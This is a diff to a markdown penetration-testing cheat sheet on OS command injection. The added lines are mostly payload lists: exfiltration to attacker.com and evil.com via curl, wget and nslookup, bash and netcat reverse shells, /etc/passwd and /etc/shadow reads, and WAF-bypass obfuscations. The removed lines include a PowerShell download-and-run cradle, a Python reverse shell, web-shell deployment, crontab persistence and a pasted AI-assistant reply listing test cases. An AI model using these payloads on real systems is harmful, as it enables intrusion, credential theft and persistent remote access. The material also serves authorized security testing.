@@ -2023,30 +2023,11 @@ ruby sub_brust.rb --fast nokia.com
 # Security Testing Techniques
 
 ## 13. Command Injection
-
+```
+cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility
+```
 ### Tool:
 - [Commix](https://github.com/commixproject/commix)
-
-Example of Command Injection with PHP:
-Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
-```
-<?php
-    $ip = $_GET['ip'];
-    system("ping -c 4 " . $ip);
-?>
-```
-### Identification:
-Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.
-
-**Example:**
-```bash
-ping -c 5 127.0.0.1
-```
-
-### Chaining Commands
-
-In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 
-
 
 * `;` (Semicolon): Allows you to execute multiple commands sequentially.
 * `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
@@ -2061,651 +2042,151 @@ command1 || command2 # Execute command2 only if command1 fails
 command1 & command2  # Execute command1 in the background
 command1 | command2  # Pipe the output of command1 into command2
 ```
-
 **Possible Parameters:**
 `filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`
 
-**Example:**
-```bash
-;ls &&ls ||ls
+# 🔹 Basic Command Injection Payloads
+
+* Simple command execution:   ; id → Executes id command.
+* Command chaining:  && whoami → Runs command if previous succeeds.
+* OR execution:  || whoami → Runs if previous fails.
+* Pipe execution:  | whoami → Pipes output to next command.
+* Backtick execution:    whoami  → Executes inline command.
+
+# 🔹 OS Command Injection Variants
+
+* Linux commands:  ; uname -al,   ; cat /etc/passwd,   ; ls -la
+* Windows commands:  & whoami, & dir, & type C:\Windows\win.ini
+* Mixed separators: ; whoami && id
+
+# 🔹 Blind Command Injection Payloads
+
+* Time delay (Linux):  ; sleep 5
+* Time delay (Windows): & timeout 5
+* DNS exfiltration: ; nslookup attacker.com
+
+* HTTP callback: ; curl http://attacker.com
+* Ping-based detection:  ; ping -c 4 attacker.com
+
+# 🔹 Command Injection with Output Exfiltration
+
+* Curl exfiltration: ; curl http://attacker.com/?data=$(whoami)
+* Wget exfiltration:  ; wget http://evil.com/$(id)
+* DNS exfiltration:  ; nslookup $(hostname).attacker.com
+* File exfiltration:  ; curl -X POST -d @/etc/passwd attacker.com
+
+# 🔹 File Read / Write Payloads
+
+* Read sensitive file:  ; cat /etc/passwd
+* Read environment variables:  ; env
+* Write file:  ; echo hacked > test.txt
+* Append file:  ; echo test >> file.txt
+
+# 🔹 Reverse Shell Payload Indicators
+
+* Bash reverse shell:; bash -i >& /dev/tcp/attacker/4444 0>&1
+* Netcat reverse shell:  ; nc attacker.com 4444 -e /bin/sh
+* Python shell:  ; python -c 'import os;os.system("sh")'
+
+# 🔹 Command Injection in Different Contexts
+
+* Within parameter: test;whoami
+* Inside quotes:  " ; whoami #
+* Numeric context:  1; whoami
+* JSON input:  {"cmd":";whoami"}
+
+# 🔹 WAF Bypass Techniques (Command Injection)
+## 🧩 Encoding Tricks
+
+* URL encoding: %3bwhoami
+* Double encoding:  %253bwhoami
+* Hex encoding:  \x77\x68\x6f\x61\x6d\x69
+* Base64 execution:  echo d2hvYW1p | base64 -d | sh
+
+## 🧩 Command Obfuscation
+
+* Use variables:${PATH} tricks
+* Split commands:  w'h'o'am'i
+* Use wildcards:   w*oami
+* Concatenation:  who$@ami
+
+## 🧩 Separator Bypass
+
+* Newline injection:  %0awhoami
+* Tab bypass:  %09whoami
+* Mixed separator:  ;|whoami
+* Logical operators:  &&& whoami
+
+## 🧩 Space Bypass
+
+* Use $IFS:  whoami$IFS
+* Tab instead of space:  whoami%09
+* No-space execution:  {whoami}
+
+## 🧩 Filter Evasion
+
+* Case variation:  WhOaMi
+* Partial command:  /bin/whoami
+* Path-based execution:  /usr/bin/id
+
+# 🔹 Advanced Injection Payloads
+
+* Subshell:  $(whoami)
+* Nested execution:   id 
+* Process substitution:  <(whoami)
+* Eval usage:  eval whoami
+
+# 🔹 Brute Force Command Injection Payload List
+
+## ✅ Common Commands (Try All)
 ```
-
-### Bypass Methods:
-```bash
-;^& && | || %0D %0A \n <
-```
-
-### Brute-force:
-- Use a payload list of commands (`cmd.txt`).
-- Use a delimiter list (`delimeter_list`).
-- Cluster bomb attack: Combines different delimiters with parameters sequentially.
-
-**Setting Payload in Injection Point:**
-```bash
-filename=$delimeter.txt$$cmd.txt$
-```
-
-**Burp Suite Intruder:**
-- Use the cluster bomb attack type.
-- Set two payloads to generate combinations of attacks.
-
-### Exploitation Tool:
-```bash
-python commix.py -u <url>
-```
-
-### Chaining Commands:
-```bash
-original_cmd_by_server; ls
-original_cmd_by_server && ls
-original_cmd_by_server | ls
-original_cmd_by_server || ls  # Only if the first command fails
-```
-
-### Inside a Command:
-```bash
-original_cmd_by_server `cat /etc/passwd`
-original_cmd_by_server $(cat /etc/passwd)
-```
-
-### Bypass Techniques:
-```bash
-w'h'o'am'i  # Single quotes bypass
-w"h"o"am"i  # Double quotes bypass
-w\ho\am\i  # Backslash bypass
-/\b\i\n/////s\h  # Slash bypass
-who$@ami  # Using $@
-echo $0   # Identifying shell
-```
-## Filter Bypasses
-
-### Bypass Without Space
-
-* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
-  ```powershell
-  cat${IFS}/etc/passwd
-  ls${IFS}-la
-  ```
-* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
-  ```powershell
-  {cat,/etc/passwd}
-  ```
-* Input redirection. The < character tells the shell to read the contents of the file specified. 
-  ```powershell
-  cat</etc/passwd
-  sh</dev/tcp/127.0.0.1/4242
-  ```
-* ANSI-C Quoting 
-  ```powershell
-  X=$'uname\x20-a'&&$X
-  ```
-* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
-  ```powershell
-  ;ls%09-al%09/home
-  ```
-* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
-  ```powershell
-  ping%CommonProgramFiles:~10,-18%127.0.0.1
-  ping%PROGRAMFILES:~10,-5%127.0.0.1
-  ```
-
-
-### Bypass With A Line Return
-
-Commands can also be run in sequence with newlines
-
-```bash
-original_cmd_by_server
+whoami
+id
+uname -a
+pwd
 ls
-```
-
-
-### Bypass With Backslash Newline
-
-* Commands can be broken into parts by using backslash followed by a newline
-  ```powershell
-  $ cat /et\
-  c/pa\
-  sswd
-  ```
-* URL encoded form would look like this:
-  ```powershell
-  cat%20/et%5C%0Ac/pa%5C%0Asswd
-  ```
-
-
-### Bypass With Tilde Expansion
-
-```powershell
-echo ~+
-echo ~-
-```
-
-### Bypass With Brace Expansion
-
-```powershell
-{,ip,a}
-{,ifconfig}
-{,ifconfig,eth0}
-{l,-lh}s
-{,echo,#test}
-{,$"whoami",}
-{,/?s?/?i?/c?t,/e??/p??s??,}
-```
-
-
-### Bypass Characters Filter
-
-Commands execution without backslash and slash - linux bash
-
-```powershell
-swissky@crashlab:~$ echo ${HOME:0:1}
-/
-
-swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ echo . | tr '!-0' '"-1'
-/
-
-swissky@crashlab:~$ tr '!-0' '"-1' <<< .
-/
-
-swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
-root:x:0:0:root:/root:/bin/bash
-```
-
-### Bypass Characters Filter Via Hex Encoding
-
-```powershell
-swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
-/etc/passwd
-
-swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
-/etc/passwd
-
-swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
-root:x:0:0:root:/root:/bin/bash
-
-swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
-/etc/passwd
-
-swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
-root:x:0:0:root:/root:/bin/bash
-```
-
-### Bypass With Single Quote
-
-```powershell
-w'h'o'am'i
-wh''oami
-'w'hoami
-```
-
-### Bypass With Double Quote
-
-```powershell
-w"h"o"am"i
-wh""oami
-"wh"oami
-```
-
-### Bypass With Backticks
-
-```powershell
-wh``oami
-```
-
-### Bypass With Backslash and Slash
-
-```powershell
-w\ho\am\i
-/\b\i\n/////s\h
-```
-
-### Bypass With $@
-
-`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
-
-```powershell
-who$@ami
-echo whoami|$0
-```
-
-
-### Bypass With $()
-
-```powershell
-who$()ami
-who$(echo am)i
-who`echo am`i
-```
-
-### Bypass With Variable Expansion
-
-```powershell
-/???/??t /???/p??s??
-
-test=/ehhh/hmtc/pahhh/hmsswd
-cat ${test//hhh\/hm/}
-cat ${test//hh??hm/}
-```
-
-### Bypass With Wildcards
-
-```powershell
-powershell C:\*\*2\n??e*d.*? # notepad
-@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
-```
-### Dns Based Data Exfiltration
-
-Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
-
-1. Go to http://dnsbin.zhack.ca/
-2. Execute a simple 'ls'
-  ```powershell
-  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
-  ```
-
-Online tools to check for DNS based data exfiltration:
-
-- http://dnsbin.zhack.ca/
-- https://app.interactsh.com/
-- Burp Collaborator
-
----
-Click-Jacking
-
-```
-<iframe src="http://target site" security="restricted"></iframe>
-```
-```
-<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
-  <a href="malicious-link">Click me</a>
-</div>
-```
-Absolutely, Anvesh! Here's a **complete OS Command Injection test case list with sample payloads**, structured for clarity and direct integration into your cheat sheets, automation scripts, or Burp Suite workflows. This aligns with your GitHub methodology and emphasizes both detection and exploitation vectors.
-
----
-
-## 🧨 OS Command Injection — Test Cases with Payloads
-
-> cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility
-
----
-
-### **1. Basic Command Injection via GET Parameter**
-- Inject shell commands using separators like `;`, `&&`, `|`.
-
-```http
-GET /vuln.php?ip=127.0.0.1;whoami HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **2. Blind Command Injection via Time Delay**
-- Use `sleep`, `ping`, or `timeout` to infer execution.
-
-```http
-GET /vuln.php?user=admin; sleep 10 HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **3. Out-of-Band (OOB) Injection**
-- Trigger DNS or HTTP callbacks to attacker-controlled server.
-
-```http
-GET /vuln.php?cmd=nslookup attacker.com HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **4. POST-Based Injection**
-- Inject into form fields or body parameters.
-
-```http
-POST /submit HTTP/1.1
-Host: vulnerable.com
-Content-Type: application/x-www-form-urlencoded
-
-username=admin;id
-```
-
----
-
-### **5. Encoded Injection**
-- Use URL encoding to bypass filters.
-
-```http
-GET /vuln.php?file=%3Bcat%20/etc/passwd HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **6. Injection via File Path Parameter**
-- Exploit filename or path variables.
-
-```http
-GET /download?file=report.txt;ls -la HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **7. Injection via Headers**
-- Inject into `User-Agent`, `Referer`, or custom headers.
-
-```http
-GET / HTTP/1.1
-Host: vulnerable.com
-User-Agent: Mozilla/5.0; uname -a
-```
-
----
-
-### **8. Injection via Cookies**
-- Target server-side parsing of cookie values.
-
-```http
-GET / HTTP/1.1
-Host: vulnerable.com
-Cookie: session=abc123;id
-```
-
----
-
-### **9. Injection via Backticks or Subshell**
-- Use backticks or `$()` for command substitution.
-
-```http
-GET /vuln.php?cmd=`id` HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **10. Windows-Specific Injection**
-- Use `&&`, `|`, or `&` with `cmd.exe`.
-
-```http
-GET /vuln.php?input=foo&cmd=dir& HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **11. Linux-Specific Injection**
-- Use `;`, `|`, or `&&` with common Linux commands.
-
-```http
-GET /vuln.php?input=bar; ls -la / HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **12. Injection via Pipes**
-- Chain commands using `|`.
-
-```http
-GET /vuln.php?cmd=cat /etc/passwd | grep root HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **13. Injection via Environment Variables**
-- Reference system variables like `$PATH`, `$HOME`.
-
-```http
-GET /vuln.php?cmd=echo $HOME HTTP/1.1
-Host: vulnerable.com
-```
-
----
-
-### **14. Injection via Command Substitution**
-- Use `$(...)` to execute nested commands.
-
-```http
-GET /vuln.php?cmd=$(whoami) HTTP/1.1
-Host: vulnerable.com
-```
-# **1. List of Vulnerabilities**
-```
-1.1 Basic Command Injection
-1.2 Blind Command Injection
-1.3 Chained Command Execution (&&, |, ;)
-1.4 Command Injection via Substitution ($(), backticks)
-1.5 Injection in System Calls (exec, system, popen)
-1.6 File-Based Injection (/bin/sh -c)
-1.7 Windows Shell Injection (cmd.exe)
-1.8 Out-of-Band (OOB) Exfiltration
-1.9 WAF/Sanitizer Bypass via Encoding
-1.10 Obfuscated/RCE Payloads (Base64, Hex, Unicode)
-```
-
----
-
-# **2. Sample Payloads (Core Attack Payloads)**
-
-*(Basic learning/test payloads)*
-
-```
-2.1 Basic Linux Command Injection
-; id
-```
-
-```
-2.2 Chained Command Execution
+ls -la
+cat /etc/passwd
+env
+printenv
+hostname
+;whoami
 && whoami
-```
-
-```
-2.3 Using Pipe Operator
-| uname -a
-```
-
-```
-2.4 Sub-shell Injection
-$(id)
-```
-
-```
-2.5 Backtick Execution
-`id`
-```
-
-```
-2.6 Blind Injection Checker
-; sleep 5
-```
-
-```
-2.7 Windows Command Injection
+|| whoami
+| whoami
+;id
+&& id
+|| id
+| id
+%3bwhoami
+%0awhoami
+%09whoami
+%3bid
+%0aid
+whoami$IFS
+cat$IFS/etc/passwd
+ls$IFS-la
+w'h'o'a'm'i
+who$@ami
+who$(echo ami)
+& whoami
 & dir
-```
-
-```
-2.8 Write File Test
-; echo TEST > /tmp/test.txt
-```
-
-```
-2.9 DNS OOB Injection
-; nslookup attacker.com
-```
-
-```
-2.10 Curl-Based Callback
-; curl attacker.com/ping
-```
-
----
-
-# **3. Sample Payloads (Updated With Real Payloads for Learning)**
-
-*(Common real-world offensive OS command injection strings)*
-
-```
-3.1 Full System Enumeration
-; id; uname -a; whoami
-```
-
-```
-3.2 Shadow File Extraction
+& hostname
+& type C:\Windows\win.ini
+; sleep 5
+& timeout 5
+; ping attacker.com
+; curl attacker.com
+; cat /etc/passwd
 ; cat /etc/shadow
+; cat /proc/self/environ
+; type C:\Windows\win.ini
+* Remote Code Execution → Inject shell commands
+* Data theft → Read sensitive files
+* Server takeover → Reverse shell execution
+* Cloud compromise → Access metadata endpoints
+* Lateral movement → Execute internal commands
 ```
-
-```
-3.3 Reverse Shell Payload (Bash)
-; bash -i >& /dev/tcp/attacker/4444 0>&1
-```
-
-```
-3.4 Python Reverse Shell
-; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
-```
-
-```
-3.5 Node.js RCE Payload
-; node -e "require('child_process').exec('id',console.log)"
-```
-
-```
-3.6 Windows Reverse Shell
-& powershell -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
-```
-
-```
-3.7 Base64 Encoded Command Execution
-; echo aWQ= | base64 -d | bash
-```
-
-```
-3.8 getenv Dump
-; printenv
-```
-
-```
-3.9 Internal Network Discovery
-; ping -c 1 127.0.0.1
-```
-
-```
-3.10 Data Exfiltration (Curl)
-; curl -F "file=@/etc/passwd" attacker/upload
-```
-
----
-
-# **4. Bypass Techniques (Filters, Encoding, WAF Evasion)**
-
-*(Bypass payload list only)*
-
-```
-4.1 Whitespace Bypass
-;${IFS}id
-```
-
-```
-4.2 IFS Injection (No Space)
-id${IFS}-a
-```
-
-```
-4.3 URL Encoded Injection
-%3B%20id
-```
-
-```
-4.4 Double URL Encoded Injection
-%253B%2520id
-```
-
-```
-4.5 Semi-colon Removal Bypass
-|id
-```
-
-```
-4.6 Comment Truncation Bypass
-;id# 
-```
-
-```
-4.7 Substitution Bypass
-`id`
-```
-
-```
-4.8 Tab Bypass
-;	id
-```
-
-```
-4.9 Base64 Obfuscation
-; echo aWQ= | base64 -d
-```
-
-```
-4.10 Environment Variable Execution
-$PATH
-```
-
----
-
-# **5. Advanced Attack Chains (Real-World Exploitation)**
-
-```
-5.1 Command Injection → Reverse Shell → Full Access
-; bash -i >& /dev/tcp/attacker/4444 0>&1
-```
-
-```
-5.2 Command Injection → Read Secrets → API Key Theft
-; cat /var/www/app/.env
-```
-
-```
-5.3 Command Injection → Pivoting Internal Network
-; nmap -sV 172.16.0.1
-```
-
-```
-5.4 File Write → Web Shell Deployment
-; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
-```
-
-```
-5.5 Blind Command Injection → DNS Exfiltration
-; nslookup `cat /etc/passwd` attacker.com
-```
-
-```
-5.6 Command Injection → Crontab Persistence
-; echo "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1" >> /etc/crontab
-```
-
-```
-5.7 Command Injection → Kernel Enumeration → PrivEsc Prep
-; uname -a; cat /proc/version; id
-```
-
 ## Insecure Management Interface
 Insecure Management Interfaces may lack proper security measures, such as strong authentication, encryption, or IP restrictions, allowing unauthorized users to potentially gain control over critical systems. Common issues include using default credentials, unencrypted communications, or exposing the interface to the public internet.
 
